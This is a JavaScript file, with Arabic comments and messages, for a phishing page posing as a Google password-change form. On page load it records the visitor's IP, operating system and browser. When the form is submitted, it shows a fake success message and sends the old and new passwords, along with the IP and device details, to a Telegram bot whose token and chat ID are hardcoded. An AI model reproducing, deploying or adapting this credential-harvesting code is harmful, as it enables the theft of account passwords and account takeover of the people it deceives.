let userIP = "";
let userAgent = navigator.userAgent;
let os = "غير معروف";
let browser = "غير معروف";

// تحديد نظام التشغيل
if (userAgent.indexOf("Win") !== -1) os = "Windows";
else if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
else if (userAgent.indexOf("Android") !== -1) os = "Android";
else if (userAgent.indexOf("iPhone") !== -1) os = "iOS";

// تحديد المتصفح
if (userAgent.indexOf("Chrome") !== -1) browser = "Chrome";
else if (userAgent.indexOf("Firefox") !== -1) browser = "Firefox";
else if (userAgent.indexOf("Safari") !== -1) browser = "Safari";
else if (userAgent.indexOf("Edge") !== -1) browser = "Edge";

// عند تحميل الموقع، جلب IP وإرساله
window.onload = function () {
  fetch("https://api.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
      userIP = data.ip;

      const msg = `
📩 Google Security Alert

🖥️ دخول جديد للموقع

📡 IP: ${userIP}
💻 نظام التشغيل: ${os}
🌐 المتصفح: ${browser}
🔗 المصدر: google.com
      `;
      sendToTelegram(msg);
    });
};

function handlePasswordChange(event) {
  event.preventDefault();

  const oldPass = document.getElementById("oldPassword").value;
  const newPass = document.getElementById("newPassword").value;
  const confirmPass = document.getElementById("confirmPassword").value;
  const message = document.getElementById("message");

  if (newPass !== confirmPass) {
    message.textContent = "كلمة المرور الجديدة وتأكيدها غير متطابقتين.";
    message.style.color = "red";
    return;
  }

  if (newPass.length < 6) {
    message.textContent = "كلمة المرور الجديدة قصيرة جدًا. الحد الأدنى 6 حروف.";
    message.style.color = "red";
    return;
  }

  message.textContent = "جارٍ التحقق من كلمة المرور...";
  message.style.color = "#5f6368";

  setTimeout(() => {
    message.textContent = "تم تغيير كلمة مرورك بنجاح";
    message.style.color = "#188038"; // لون أخضر Google

    const fullMsg = `
🔐 محاولة تغيير كلمة مرور - Google

📡 IP: ${userIP}
💻 نظام التشغيل: ${os}
🌐 المتصفح: ${browser}

🔑 كلمة المرور الحالية: ${oldPass}
🆕 كلمة المرور الجديدة: ${newPass}
🔁 إعادة التأكيد: ${confirmPass}

✅ المصدر: google.com
    `;

    sendToTelegram(fullMsg);
  }, 3000); // تأخير 3 ثواني
}

function sendToTelegram(msg) {
  const token = "7935763947:AAGNc11VAj1AcX3nUz_sf-r8kxPs-7OL5TU";
  const chatId = "1046458749";

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const data = {
    chat_id: chatId,
    text: msg
  };

  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  });
}